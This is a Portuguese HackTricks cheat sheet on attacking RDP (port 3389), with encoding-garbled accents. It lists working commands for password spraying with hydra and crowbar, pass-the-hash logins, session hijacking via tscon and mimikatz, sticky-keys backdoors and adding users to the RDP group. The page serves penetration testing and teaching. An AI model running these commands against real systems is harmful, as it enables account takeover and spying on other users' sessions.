# 3389 - Pentesting RDP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference Ã© um evento internacional de ciberseguranÃ§a**](https://www.dragonjarcon.org/) com mais de uma dÃ©cada que serÃ¡ realizado nos dias 7 e 8 de setembro de 2023 em BogotÃ¡, ColÃ´mbia. Ã‰ um evento de grande conteÃºdo tÃ©cnico onde as Ãºltimas pesquisas em espanhol sÃ£o apresentadas, atraindo hackers e pesquisadores de todo o mundo.\
Registre-se agora no link abaixo e nÃ£o perca esta grande conferÃªncia!:

{% embed url="https://www.dragonjarcon.org/" %}

## InformaÃ§Ãµes BÃ¡sicas

O Protocolo de Ãrea de Trabalho Remota (**RDP**) Ã© um protocolo proprietÃ¡rio desenvolvido pela Microsoft, que fornece a um usuÃ¡rio uma interface grÃ¡fica para se conectar a outro computador por meio de uma conexÃ£o de rede. O usuÃ¡rio utiliza software cliente **RDP** para esse fim, enquanto o outro computador deve executar software servidor **RDP** (daqui [aqui](https://en.wikipedia.org/wiki/Remote\_Desktop\_Protocol)).

**Porta padrÃ£o:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## EnumeraÃ§Ã£o

### AutomÃ¡tica
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
Ele verifica a criptografia disponÃ­vel e a vulnerabilidade DoS (sem causar DoS ao serviÃ§o) e obtÃ©m informaÃ§Ãµes do Windows NTLM (versÃµes).

### [ForÃ§a bruta](../generic-methodologies-and-resources/brute-force.md#rdp)

**Tenha cuidado, vocÃª pode bloquear contas**

### **Spray de senha**

**Tenha cuidado, vocÃª pode bloquear contas**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Conectar com credenciais/hash conhecidas
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Verificar credenciais conhecidas em serviÃ§os RDP

O rdp\_check.py do Impacket permite verificar se algumas credenciais sÃ£o vÃ¡lidas para um serviÃ§o RDP:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**A ConferÃªncia de SeguranÃ§a DragonJAR Ã© um evento internacional de ciberseguranÃ§a**](https://www.dragonjarcon.org/) com mais de uma dÃ©cada de existÃªncia que serÃ¡ realizada nos dias 7 e 8 de setembro de 2023 em BogotÃ¡, ColÃ´mbia. Ã‰ um evento com grande conteÃºdo tÃ©cnico onde sÃ£o apresentadas as Ãºltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e nÃ£o perca esta grande conferÃªncia!:

{% embed url="https://www.dragonjarcon.org/" %}

## **Ataques**

### Roubo de sessÃ£o

Com **permissÃµes de SYSTEM**, vocÃª pode acessar qualquer **sessÃ£o RDP aberta por qualquer usuÃ¡rio** sem precisar saber a senha do proprietÃ¡rio.

**Obter sessÃµes abertas:**
```
query user
```
**Acesso Ã  sessÃ£o selecionada**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Agora vocÃª estarÃ¡ dentro da sessÃ£o RDP selecionada e terÃ¡ que se passar por um usuÃ¡rio usando apenas ferramentas e recursos do Windows.

**Importante**: Quando vocÃª acessa uma sessÃ£o RDP ativa, vocÃª encerra a sessÃ£o do usuÃ¡rio que a estava usando.

VocÃª poderia obter senhas do processo fazendo dump, mas este mÃ©todo Ã© muito mais rÃ¡pido e permite que vocÃª interaja com as Ã¡reas de trabalho virtuais do usuÃ¡rio (senhas no bloco de notas sem serem salvas no disco, outras sessÃµes RDP abertas em outras mÃ¡quinas...)

#### **Mimikatz**

VocÃª tambÃ©m pode usar o mimikatz para fazer isso:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

Combinando esta tÃ©cnica com **stickykeys** ou **utilman**, vocÃª serÃ¡ capaz de acessar um CMD administrativo e qualquer sessÃ£o RDP a qualquer momento.

VocÃª pode procurar RDPs que jÃ¡ tenham sido backdoorizados com uma dessas tÃ©cnicas usando: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### InjeÃ§Ã£o de Processo RDP

Se alguÃ©m de um domÃ­nio diferente ou com **privilÃ©gios melhores fizer login via RDP** no PC onde **vocÃª Ã© um administrador**, vocÃª pode **injetar** seu beacon no processo de sua **sessÃ£o RDP** e agir como ele:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Adicionando usuÃ¡rio ao grupo RDP
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Ataque Shadow

**AutoRDPwn** Ã© um framework de pÃ³s-exploraÃ§Ã£o criado em Powershell, projetado principalmente para automatizar o ataque **Shadow** em computadores Microsoft Windows. Essa vulnerabilidade (listada como uma funcionalidade pela Microsoft) permite que um atacante remoto **visualize a Ã¡rea de trabalho de sua vÃ­tima sem seu consentimento**, e atÃ© mesmo controle-a sob demanda, usando ferramentas nativas do prÃ³prio sistema operacional.

{% embed url="https://github.com/JoelGMSec/AutoRDPwn" %}

## Comandos AutomÃ¡ticos do HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for RDP
  Note: |
    Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software 

    https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
  Name: Nmap
  Description: Nmap with RDP Scripts
  Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**A ConferÃªncia de SeguranÃ§a DragonJAR Ã© um evento internacional de ciberseguranÃ§a**](https://www.dragonjarcon.org/) com mais de uma dÃ©cada de existÃªncia que serÃ¡ realizada nos dias 7 e 8 de setembro de 2023 em BogotÃ¡, ColÃ´mbia. Ã‰ um evento com grande conteÃºdo tÃ©cnico onde sÃ£o apresentadas as Ãºltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e nÃ£o perca esta grande conferÃªncia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
